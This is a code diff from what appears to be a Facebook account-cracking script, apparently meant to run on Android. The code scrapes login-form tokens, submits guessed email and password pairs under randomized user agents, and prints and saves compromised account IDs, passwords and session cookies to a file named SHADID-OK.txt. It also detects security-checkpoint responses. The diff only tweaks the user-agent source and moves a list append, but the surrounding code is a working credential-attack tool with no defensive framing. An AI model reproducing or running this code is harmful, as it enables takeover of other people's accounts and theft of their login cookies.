@@ -146,7 +146,7 @@ def host(uid, pwx, meth, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = agent 
+            uax = ua()
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
             lsd = lsb()
@@ -186,9 +186,10 @@ def host(uid, pwx, meth, fb):
                     coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                     xx = coki.split("c_user=")[1]
                     xd = xx[:15].replace(";", "  ")
-                    oks.append(xd)
+                    
                     print(f"\r\r[SHADID-OK] {xd} <> {ps}\n[Cookies]{coki}")  
                     open("/sdcard/SHADID-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
+                    oks.append(xd)
                     break
                     
             elif "checkpoint" in heron_brand:
